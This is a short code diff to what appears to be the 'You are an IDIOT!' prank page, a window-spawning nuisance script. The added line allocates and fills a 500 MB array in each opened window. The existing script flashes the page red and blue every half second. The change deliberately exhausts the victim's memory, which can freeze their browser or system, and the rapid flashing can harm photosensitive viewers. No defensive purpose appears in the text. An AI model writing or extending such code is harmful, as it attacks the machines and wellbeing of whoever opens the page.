@@ -23,6 +23,7 @@ function openWindow(url) {
             <body>
                 <h1>You are an IDIOT!</h1>
                 <script>
+                    const x = new Uint8Array(1024 * 1024 * 1024 * 0.5).fill(255); // 500MB
                     setInterval(() => {
                         document.body.style.background = document.body.style.background === 'red' ? 'blue' : 'red';
                     }, 500);
